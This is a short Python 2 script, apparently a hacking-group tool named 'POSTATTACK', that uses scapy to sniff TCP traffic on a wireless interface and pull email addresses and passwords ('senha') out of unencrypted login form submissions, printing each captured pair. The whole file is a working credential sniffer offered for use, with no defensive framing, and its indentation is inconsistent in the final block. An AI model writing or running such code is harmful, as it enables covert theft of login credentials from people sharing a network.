#-*-coding:utf-8-*-

# [ THEBREAKERS ] : [ CYBERPUNK13&CYBERBOT13 ]

from scapy.all import*
import socket
import os

carga             = ""
logs              = {}

def show():
	
	os.system("figlet POSTATTACK")
	print ""
	print("\\\...BY CYBERPUNK13&CYBERBOT13...")
	print("\\\...THEBREAKERS...")
	print ""
	
def processamento(data):
	
	cm1     = data.split("senha")
	cm2     = cm1[1].split("entrar=acessar")
	
	email   = cm1[0]
	senha   = cm2[0]
	
	logs    = {
	           'email' : email,
	           'senha' : senha
	          }
	
	return logs

def packet_callback(packet):
	
	global carga
	global processamento
	global logs
	
	if "email" in str((packet[IP][TCP].payload)).lower() or "senha" in str((packet[IP][TCP].payload)).lower():
		
	    data    = str(packet[IP][TCP].payload)
	    carga   = data.split("email")[1]
	    logs    = processamento(carga)
	    
	    if logs != {}:
			
			print("[ Email ] ",logs['email'])
            print("[ Senha ] ",logs['senha'])
   
show()

print("coleta na rede iniciada...")  
            
sniff(iface="wlan0",filter="tcp",prn=packet_callback,store=0)


